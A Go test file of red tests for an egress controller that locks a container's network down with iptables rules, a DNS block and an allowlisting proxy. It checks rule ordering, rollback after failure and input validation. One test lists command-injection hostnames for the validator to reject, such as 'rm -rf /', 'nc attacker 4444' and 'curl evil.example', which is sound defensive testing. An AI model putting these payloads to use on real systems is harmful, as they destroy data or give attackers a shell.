// egress_test.go — red tests for the EgressController.
//
// These tests are the executable specification of the egress-controller
// workstream. Per docs/PHILOSOPHY.md § "Strict mode", `egress.go` is a
// strict-mode path: the tests here pin exact command shapes where those
// commands are part of the security contract, and enumerate every boundary
// rejection the implementation must enforce.
//
// Tests use the shared `fakeSSHRunner` in fakes_test.go. Each test gets a
// fresh fake + fresh EgressController so observations never cross tests.
//
// ALL STUB CALLS PANIC. These tests are red — they fail by panic from the
// unimplemented stubs. `go test` surfaces each panic as a FAIL with the
// stub's "egress-controller workstream: ... not yet implemented" message,
// which is exactly the signal we want for a red suite.

package main

import (
	"context"
	"errors"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

// newTestEgressFixture returns a fresh EgressController wired to a fresh
// fakeSSHRunner, plus a stable fake Host. No global state.
func newTestEgressFixture() (*EgressController, *fakeSSHRunner, Host) {
	runner := newFakeSSHRunner()
	ctl := NewEgressController(runner, "/laptop/path/to/proxy-binaries")
	host := Host{
		Address:     "ubuntu@203.0.113.7:22",
		BackendType: "fly",
		Workspace:   "/home/fly/workspace",
	}
	return ctl, runner, host
}

// assertRunCallContains fails the test unless there is at least one RunCalls
// entry containing every required substring (all substrings, same call).
// Used where command structure matters but exact byte-for-byte text does not.
func assertRunCallContains(t *testing.T, runner *fakeSSHRunner, substrings ...string) {
	t.Helper()
	for _, cmd := range runner.RunCalls {
		matched := true
		for _, needle := range substrings {
			if !strings.Contains(cmd, needle) {
				matched = false
				break
			}
		}
		if matched {
			return
		}
	}
	t.Fatalf("no SSH Run call contained all of %v; observed calls: %q", substrings, runner.RunCalls)
}

// indexOfRunCallContaining returns the index of the first RunCalls entry
// containing `substr`, or -1 if none. Used to assert ordering between
// security-sensitive operations.
func indexOfRunCallContaining(runner *fakeSSHRunner, substr string) int {
	for i, cmd := range runner.RunCalls {
		if strings.Contains(cmd, substr) {
			return i
		}
	}
	return -1
}

// indexOfCopyCallWithDstContaining returns the index of the first CopyCalls
// entry whose Dst contains `substr`, or -1. Copy calls are tracked in a
// separate slice from Run calls; for ordering we compare positions in a
// unified timeline approximated by the runner's observation order.
func indexOfCopyCallWithDstContaining(runner *fakeSSHRunner, substr string) int {
	for i, c := range runner.CopyCalls {
		if strings.Contains(c.Dst, substr) || strings.Contains(c.Src, substr) {
			return i
		}
	}
	return -1
}

// ---------------------------------------------------------------------------
// 1. Enforcement correctness — iptables + scp + proxy start in the right order
// ---------------------------------------------------------------------------

// TestInstallAppliesIptablesAndStartsProxyInOrder pins the exact install
// sequence on a host with a concrete allowlist.
//
// Security invariant (PHILOSOPHY.md § Strict mode):
// "every operation fails loud". The order is part of the contract: DNS block
// and the DROP-except-to-proxy rule must be in place BEFORE the proxy is
// started, otherwise there is a window where the container could reach
// arbitrary hosts. Deviation from this order is a test failure.
func TestInstallAppliesIptablesAndStartsProxyInOrder(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	err := ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, nil)
	if err != nil {
		t.Fatalf("Install returned error: %v", err)
	}

	// (a) DROP outbound from the container bridge except to the proxy.
	dropExceptProxyIdx := -1
	for i, cmd := range runner.RunCalls {
		if strings.Contains(cmd, "iptables") &&
			strings.Contains(cmd, "DROP") &&
			(strings.Contains(cmd, "FORWARD") || strings.Contains(cmd, "OUTPUT")) {
			dropExceptProxyIdx = i
			break
		}
	}
	if dropExceptProxyIdx < 0 {
		t.Fatalf("expected an iptables DROP rule on the container bridge; got calls: %q", runner.RunCalls)
	}

	// (b) DROP outbound UDP 53 and TCP 53 (DNS block).
	udpDNSIdx := -1
	tcpDNSIdx := -1
	for i, cmd := range runner.RunCalls {
		if strings.Contains(cmd, "iptables") && strings.Contains(cmd, "DROP") &&
			strings.Contains(cmd, "udp") && strings.Contains(cmd, "53") {
			udpDNSIdx = i
		}
		if strings.Contains(cmd, "iptables") && strings.Contains(cmd, "DROP") &&
			strings.Contains(cmd, "tcp") && strings.Contains(cmd, "53") {
			tcpDNSIdx = i
		}
	}
	if udpDNSIdx < 0 {
		t.Fatalf("expected iptables DROP on UDP 53; got calls: %q", runner.RunCalls)
	}
	if tcpDNSIdx < 0 {
		t.Fatalf("expected iptables DROP on TCP 53; got calls: %q", runner.RunCalls)
	}

	// (c) scp of the aa-proxy binary to the host.
	if len(runner.CopyCalls) == 0 {
		t.Fatalf("expected at least one Copy call scp'ing the aa-proxy binary")
	}
	proxyCopyIdx := indexOfCopyCallWithDstContaining(runner, "aa-proxy")
	if proxyCopyIdx < 0 {
		t.Fatalf("expected a Copy call whose src or dst names 'aa-proxy'; got: %+v", runner.CopyCalls)
	}

	// (d) Start the proxy with the allowlist.
	proxyStartIdx := indexOfRunCallContaining(runner, "aa-proxy")
	if proxyStartIdx < 0 {
		t.Fatalf("expected a Run call starting the aa-proxy; got: %q", runner.RunCalls)
	}
	if !strings.Contains(runner.RunCalls[proxyStartIdx], "api.anthropic.com") {
		t.Fatalf("proxy start command must include the allowlisted hostname; got: %q", runner.RunCalls[proxyStartIdx])
	}

	// Ordering: the iptables DROP rules must appear before the proxy-start
	// Run call. (The scp of the binary must happen before the proxy-start
	// Run call, obviously — can't exec what isn't there yet; but the scp is
	// in a separate slice and ordering across slices isn't timestamped by
	// the fake, so we assert the Run-vs-Run ordering only.)
	if dropExceptProxyIdx >= proxyStartIdx {
		t.Fatalf("DROP-except-to-proxy rule (%d) must come before proxy start (%d); calls: %q",
			dropExceptProxyIdx, proxyStartIdx, runner.RunCalls)
	}
	if udpDNSIdx >= proxyStartIdx || tcpDNSIdx >= proxyStartIdx {
		t.Fatalf("DNS block rules must come before proxy start; udp=%d tcp=%d proxy=%d calls: %q",
			udpDNSIdx, tcpDNSIdx, proxyStartIdx, runner.RunCalls)
	}
}

// ---------------------------------------------------------------------------
// 2. ["*"] allowlist — explicit opt-out installs no iptables rules
// ---------------------------------------------------------------------------

func TestInstallWithWildcardAllowlistInstallsNoIptablesRules(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	err := ctl.Install(context.Background(), host, []string{"*"}, nil)
	if err != nil {
		t.Fatalf("Install with [\"*\"] must succeed as explicit opt-out; got: %v", err)
	}

	for _, cmd := range runner.RunCalls {
		if strings.Contains(cmd, "iptables") {
			t.Fatalf("allowlist [\"*\"] must install zero iptables rules; observed: %q", cmd)
		}
	}
}

// ---------------------------------------------------------------------------
// 3. Empty allowlist is a hard error
// ---------------------------------------------------------------------------

// TestInstallRejectsEmptyAllowlist enforces the strict-mode invariant that
// there is no valid "zero hosts" interpretation: an empty allowlist is a
// config mistake, not a policy.
//
// Security invariant (PHILOSOPHY.md § Strict mode):
// "disallow unknown input" + "fail loud" + "errors include what, why, and
// what-next". An empty allowlist must surface as a typed error whose text
// names the allowlist field and why it was rejected.
func TestInstallRejectsEmptyAllowlist(t *testing.T) {
	ctl, _, host := newTestEgressFixture()

	err := ctl.Install(context.Background(), host, []string{}, nil)
	if err == nil {
		t.Fatal("Install with empty allowlist must return a hard error")
	}
	msg := err.Error()
	if !strings.Contains(msg, "allowlist") {
		t.Fatalf("error text must name the 'allowlist' field; got: %q", msg)
	}
	if !strings.Contains(msg, "empty") && !strings.Contains(msg, "zero") && !strings.Contains(msg, "at least") {
		t.Fatalf("error text must explain why empty is rejected; got: %q", msg)
	}
}

func TestInstallRejectsNilAllowlist(t *testing.T) {
	ctl, _, host := newTestEgressFixture()

	err := ctl.Install(context.Background(), host, nil, nil)
	if err == nil {
		t.Fatal("Install with nil allowlist must return a hard error")
	}
}

// ---------------------------------------------------------------------------
// 4. Hostnames with shell metacharacters are a hard error
// ---------------------------------------------------------------------------

// TestInstallRejectsMetacharactersInHostname enumerates representative
// hostile inputs. The rule is: allowlist entries must match a strict
// hostname regex. Every input below MUST be rejected.
//
// Security invariant (PHILOSOPHY.md § Strict mode):
// "No unescaped interpolation into shell" (from ssh.go / ssh_runner.go
// listing). Because the allowlist is spliced into iptables rules and the
// proxy command line, any character that could terminate the current token
// or start a new shell word is a container-escape vector. Validate at
// entry; reject at the boundary.
func TestInstallRejectsMetacharactersInHostname(t *testing.T) {
	bad := []struct {
		name     string
		hostname string
	}{
		{"semicolon-command-injection", "api.anthropic.com; rm -rf /"},
		{"pipe", "api.anthropic.com|nc attacker 4444"},
		{"logical-and", "api.anthropic.com && curl evil.example"},
		{"backtick-substitution", "api.anthropic.com`id`"},
		{"dollar-paren-substitution", "api.anthropic.com$(id)"},
		{"embedded-whitespace", "api.anthropic.com evil.example"},
		{"newline", "api.anthropic.com\nevil.example"},
		{"tab", "api.anthropic.com\tevil.example"},
		{"redirect", "api.anthropic.com > /tmp/x"},
		{"single-quote", "api.anthropic.com'"},
		{"double-quote", "api.anthropic.com\""},
		{"glob-star", "api.*.com"},
		{"leading-dash", "-la"},
		{"empty-string", ""},
		{"space-only", "   "},
		{"null-byte", "api.anthropic.com\x00evil.example"},
	}
	for _, tc := range bad {
		t.Run(tc.name, func(t *testing.T) {
			ctl, runner, host := newTestEgressFixture()

			err := ctl.Install(context.Background(), host, []string{tc.hostname}, nil)
			if err == nil {
				t.Fatalf("Install must reject hostname %q; got nil error", tc.hostname)
			}
			for _, cmd := range runner.RunCalls {
				if strings.Contains(cmd, tc.hostname) {
					t.Fatalf("rejected hostname %q leaked into SSH command: %q", tc.hostname, cmd)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 5. testResolve keys must be a subset of allowlist
// ---------------------------------------------------------------------------

// TestInstallRejectsTestResolveForUnallowlistedHost enforces a consistency
// invariant between two config fields.
//
// Security invariant (PHILOSOPHY.md § Strict mode):
// "validate every field, disallow unknown input". A test-resolve entry for
// `evil.example` when the allowlist is `["api.anthropic.com"]` signals a
// config mistake: the proxy will never forward to `evil.example`, so
// pre-resolving it is meaningless at best and misleading at worst. Reject.
func TestInstallRejectsTestResolveForUnallowlistedHost(t *testing.T) {
	ctl, _, host := newTestEgressFixture()

	testResolve := map[string]string{
		"evil.example": "10.0.0.1",
	}
	err := ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, testResolve)
	if err == nil {
		t.Fatal("Install must reject testResolve entries not in allowlist")
	}
	msg := err.Error()
	if !strings.Contains(msg, "evil.example") && !strings.Contains(msg, "testResolve") && !strings.Contains(msg, "allowlist") {
		t.Fatalf("error must name the offending host or the relationship; got: %q", msg)
	}
}

func TestInstallAcceptsTestResolveWhenHostIsAllowlisted(t *testing.T) {
	ctl, _, host := newTestEgressFixture()

	testResolve := map[string]string{
		"api.anthropic.com": "151.101.65.123",
	}
	err := ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, testResolve)
	if err != nil {
		t.Fatalf("Install with consistent testResolve must succeed; got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 6. Proxy start-up command shape matches the allowlist
// ---------------------------------------------------------------------------

func TestInstallProxyStartCommandCarriesAllAllowlistHosts(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	allow := []string{"api.anthropic.com", "registry.npmjs.org", "pypi.org"}
	err := ctl.Install(context.Background(), host, allow, nil)
	if err != nil {
		t.Fatalf("Install returned: %v", err)
	}

	proxyIdx := indexOfRunCallContaining(runner, "aa-proxy")
	if proxyIdx < 0 {
		t.Fatalf("expected an aa-proxy start command; got: %q", runner.RunCalls)
	}
	cmd := runner.RunCalls[proxyIdx]
	for _, host := range allow {
		if !strings.Contains(cmd, host) {
			t.Fatalf("proxy command must name allowlisted host %q; got: %q", host, cmd)
		}
	}
	// The --allowlist flag (or equivalent `--allow` repeated) is the
	// contract. One of these forms must appear.
	if !strings.Contains(cmd, "--allow") {
		t.Fatalf("proxy command must pass allowlist via an --allow* flag; got: %q", cmd)
	}
}

// ---------------------------------------------------------------------------
// 7. Remove reverses the iptables rules and stops the proxy
// ---------------------------------------------------------------------------

func TestRemoveReversesIptablesAndStopsProxy(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	// Arrange: install first so there's state to tear down. Ignore any
	// error; the test asserts what Remove composes regardless.
	_ = ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, nil)

	installRunCount := len(runner.RunCalls)

	err := ctl.Remove(context.Background(), host)
	if err != nil {
		t.Fatalf("Remove returned error: %v", err)
	}

	removeCalls := runner.RunCalls[installRunCount:]
	if len(removeCalls) == 0 {
		t.Fatalf("Remove must issue at least one SSH command to tear down state")
	}

	sawIptablesDelete := false
	sawProxyStop := false
	for _, cmd := range removeCalls {
		if strings.Contains(cmd, "iptables") &&
			(strings.Contains(cmd, "-D") || strings.Contains(cmd, "--delete") || strings.Contains(cmd, "-F") || strings.Contains(cmd, "--flush")) {
			sawIptablesDelete = true
		}
		// A proxy stop is either `kill`, `pkill aa-proxy`, `systemctl stop`, or equivalent.
		if strings.Contains(cmd, "aa-proxy") && (strings.Contains(cmd, "kill") || strings.Contains(cmd, "stop")) {
			sawProxyStop = true
		}
		if strings.Contains(cmd, "pkill") && strings.Contains(cmd, "aa-proxy") {
			sawProxyStop = true
		}
	}
	if !sawIptablesDelete {
		t.Fatalf("Remove must delete/flush iptables rules; observed: %q", removeCalls)
	}
	if !sawProxyStop {
		t.Fatalf("Remove must stop the aa-proxy; observed: %q", removeCalls)
	}
}

// ---------------------------------------------------------------------------
// 8. Remove after a failed Install — idempotent
// ---------------------------------------------------------------------------

func TestRemoveAfterFailedInstallSucceeds(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	// Arrange: make the Copy step fail mid-Install, leaving partial iptables
	// state on the host.
	runner.CopyFn = func(ctx context.Context, h Host, src, dst string) error {
		return errors.New("simulated scp failure")
	}

	_ = ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, nil)

	// Reset Copy so Remove isn't blocked by the same failure.
	runner.CopyFn = nil

	if err := ctl.Remove(context.Background(), host); err != nil {
		t.Fatalf("Remove after failed Install must succeed (idempotent); got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 9. Remove on a virgin host — no-op, returns nil
// ---------------------------------------------------------------------------

func TestRemoveOnHostWithNothingInstalledIsNoOp(t *testing.T) {
	ctl, _, host := newTestEgressFixture()

	if err := ctl.Remove(context.Background(), host); err != nil {
		t.Fatalf("Remove on a host that was never Installed must return nil; got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 10. SSH failure mid-Install → rollback
// ---------------------------------------------------------------------------

// TestInstallRollsBackOnMidFlightSSHFailure enforces the cleanup discipline.
//
// Security invariant (PHILOSOPHY.md § Strict mode):
// "never swallow an error" + "fail loud". A partially-installed egress
// lockdown is a worse state than no lockdown at all: the operator thinks
// they're protected and they are not. Rollback any applied rules and
// return an error naming what was rolled back.
func TestInstallRollsBackOnMidFlightSSHFailure(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	// Arrange: fail on the scp of the proxy binary, which must happen after
	// at least some iptables rules have been applied. Observable: the
	// rollback delete/flush commands are issued before Install returns.
	runner.CopyFn = func(ctx context.Context, h Host, src, dst string) error {
		return errors.New("simulated scp failure: connection reset")
	}

	err := ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, nil)
	if err == nil {
		t.Fatal("Install must return an error when an SSH step fails")
	}

	sawRollback := false
	for _, cmd := range runner.RunCalls {
		if strings.Contains(cmd, "iptables") &&
			(strings.Contains(cmd, "-D") || strings.Contains(cmd, "--delete") || strings.Contains(cmd, "-F") || strings.Contains(cmd, "--flush")) {
			sawRollback = true
			break
		}
	}
	if !sawRollback {
		t.Fatalf("Install failure must trigger an iptables rollback; observed: %q", runner.RunCalls)
	}
}

// ---------------------------------------------------------------------------
// 11. Error text names the failed step and what was rolled back
// ---------------------------------------------------------------------------

// TestInstallErrorTextNamesStepAndRollback enforces the observability
// invariant at a strict-mode boundary.
//
// Security invariant (PHILOSOPHY.md § Strict mode, applied via axis 3
// "Observability for the solo developer"): "errors include what, why, and
// what-next". A generic "install failed" here delays diagnosis of a
// security-boundary failure; the step name plus the rollback outcome are
// both required.
func TestInstallErrorTextNamesStepAndRollback(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	runner.CopyFn = func(ctx context.Context, h Host, src, dst string) error {
		return errors.New("simulated scp failure: permission denied")
	}

	err := ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, nil)
	if err == nil {
		t.Fatal("expected an error")
	}
	msg := err.Error()

	// Must name what step failed — the scp / proxy-binary-copy step.
	if !(strings.Contains(msg, "scp") || strings.Contains(msg, "copy") || strings.Contains(msg, "proxy binary")) {
		t.Fatalf("error must name the failed step (scp/copy/proxy binary); got: %q", msg)
	}
	// Must name that rollback happened (or what was rolled back).
	if !(strings.Contains(msg, "rollback") || strings.Contains(msg, "rolled back") || strings.Contains(msg, "reverted")) {
		t.Fatalf("error must state that rollback occurred; got: %q", msg)
	}
}

// ---------------------------------------------------------------------------
// 12. Context cancellation mid-Install triggers rollback
// ---------------------------------------------------------------------------

// TestInstallRollsBackOnContextCancellation protects the same partial-state
// invariant as #10, but triggered by ctx cancellation rather than an SSH
// error.
//
// Security invariant (PHILOSOPHY.md § Strict mode):
// "timeout every I/O" + fail-loud on partial state. Context cancellation
// is a legitimate signal (operator hit Ctrl-C, session timeout, parent
// deadline). The cleanup path must be identical to the SSH-failure path;
// the host must not be left with DROP rules and no proxy.
func TestInstallRollsBackOnContextCancellation(t *testing.T) {
	ctl, runner, host := newTestEgressFixture()

	ctx, cancel := context.WithCancel(context.Background())

	// Arrange: cancel the context as soon as any Run call is observed. This
	// simulates the operator aborting mid-Install after the first iptables
	// rule goes in.
	runner.RunFn = func(c context.Context, h Host, cmd string) (SSHResult, error) {
		cancel()
		if c.Err() != nil {
			return SSHResult{}, c.Err()
		}
		return SSHResult{}, nil
	}

	err := ctl.Install(ctx, host, []string{"api.anthropic.com"}, nil)
	if err == nil {
		t.Fatal("Install with cancelled context must return an error")
	}

	sawRollback := false
	for _, cmd := range runner.RunCalls {
		if strings.Contains(cmd, "iptables") &&
			(strings.Contains(cmd, "-D") || strings.Contains(cmd, "--delete") || strings.Contains(cmd, "-F") || strings.Contains(cmd, "--flush")) {
			sawRollback = true
			break
		}
	}
	if !sawRollback {
		t.Fatalf("context cancellation must trigger iptables rollback; observed: %q", runner.RunCalls)
	}
}

// ---------------------------------------------------------------------------
// Structural sanity — wiring, using the shape pinned in the stub file
// ---------------------------------------------------------------------------

func TestNewEgressControllerStoresFields(t *testing.T) {
	runner := newFakeSSHRunner()
	ctl := NewEgressController(runner, "/some/dir")
	if ctl == nil {
		t.Fatal("NewEgressController returned nil")
	}
	if ctl.SSHRunner == nil {
		t.Fatal("SSHRunner not stored")
	}
	if ctl.ProxyBinariesDir != "/some/dir" {
		t.Fatalf("ProxyBinariesDir not stored; got %q", ctl.ProxyBinariesDir)
	}
}

// Guard against accidentally calling a real iptables during a test run.
// The fake runner is the only place commands should go.
func TestInstallBlocksDNSFromContainer(t *testing.T) {
	// Named per the convention in the task prompt. Equivalent to part of
	// TestInstallAppliesIptablesAndStartsProxyInOrder — pinned here as a
	// standalone, easier-to-grep red test.
	//
	// Security invariant (PHILOSOPHY.md § Strict mode):
	// DNS is the exfil channel if it isn't blocked. The README §
	// "Egress allowlisting" specifies: the container's resolver points at
	// 127.0.0.1 which answers nothing; DNS is blocked outbound. Both TCP
	// and UDP 53 must be DROP'd.
	ctl, runner, host := newTestEgressFixture()

	err := ctl.Install(context.Background(), host, []string{"api.anthropic.com"}, nil)
	if err != nil {
		t.Fatalf("Install returned: %v", err)
	}

	assertRunCallContains(t, runner, "iptables", "DROP", "udp", "53")
	assertRunCallContains(t, runner, "iptables", "DROP", "tcp", "53")
}
